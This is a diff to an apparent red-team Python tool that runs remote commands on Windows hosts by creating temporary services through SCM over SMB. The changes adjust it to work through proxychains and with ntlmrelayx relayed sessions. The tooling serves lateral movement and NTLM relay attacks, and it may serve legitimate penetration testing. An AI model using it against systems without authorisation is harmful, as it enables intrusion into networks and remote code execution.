@@ -138,9 +138,13 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
     if verbose:
         print(f'  [scm] svc={svc_name}  out={out_win}', file=sys.stderr)
 
-    # Create + start service (-Start flag, -PreferSmb forces named pipe transport)
+    # -PreferSmb: force named-pipe transport (port 445 only, no TCP/135).
+    # -UseTcp4Only: Titanis resolves hostnames and may get AAAA records first;
+    # proxychains only hooks AF_INET connect(), so IPv6 bypasses it and fails.
+    _sf = ['-PreferSmb', '-UseTcp4Only']
+
     _, rc = run(SCM, 'create', auth,
-                [host, svc_name, bin_path, '-Start', '-PreferSmb'],
+                [host, svc_name, bin_path, '-Start'] + _sf,
                 verbose=verbose, timeout=30)
     if rc != 0:
         return f'[!] Scm create failed (rc={rc})\n', rc
@@ -151,7 +155,7 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
     while time.time() < deadline:
         time.sleep(0.5)
         out, _ = run(SCM, 'query', auth,
-                     [host, '-ConsoleOutputStyle', 'Csv', '-PreferSmb'],
+                     [host, '-ConsoleOutputStyle', 'Csv'] + _sf,
                      verbose=False, timeout=15)
         for row in _parse_csv(out):
             if row.get('ServiceName', '').lower() == svc_name.lower():
@@ -162,15 +166,15 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
         if state == 'Stopped':
             break
     else:
-        # Timed out — try to stop the service before cleanup
-        run(SCM, 'stop', auth, [host, svc_name, '-PreferSmb'],
+        run(SCM, 'stop', auth, [host, svc_name] + _sf,
             verbose=verbose, timeout=15)
 
-    # Retrieve output file
+    # Retrieve output file via SMB. Use IP in UNC path to skip DFS referral
+    # lookups (DFS contacts the DC on LDAP/389 which ntlmrelayx can't relay).
     result    = ''
     local_tmp = tempfile.mktemp(suffix='.txt')
     out, rc = run(SMB, 'get', auth,
-                  [out_unc, local_tmp, '-Overwrite'],
+                  [out_unc, local_tmp, '-Overwrite', '-UseTcp4Only'],
                   verbose=verbose, timeout=30)
     if rc == 0 and os.path.exists(local_tmp):
         try:
@@ -182,8 +186,7 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
             except OSError:
                 pass
 
-    # Cleanup: delete the service (already stopped)
-    run(SCM, 'delete', auth, [host, svc_name, '-PreferSmb'],
+    run(SCM, 'delete', auth, [host, svc_name] + _sf,
         verbose=verbose, timeout=15)
 
     return result, 0
@@ -281,7 +284,7 @@ def cmd_services(host, auth, verbose=False, prefer_smb=False):
         return
     extra = [host, '-ConsoleOutputStyle', 'Csv']
     if prefer_smb:
-        extra.append('-PreferSmb')
+        extra += ['-PreferSmb', '-UseTcp4Only']
     out, rc = run(SCM, 'query', auth, extra, verbose=verbose, timeout=30)
     if rc != 0:
         print(f'[!] services failed\n{out}')
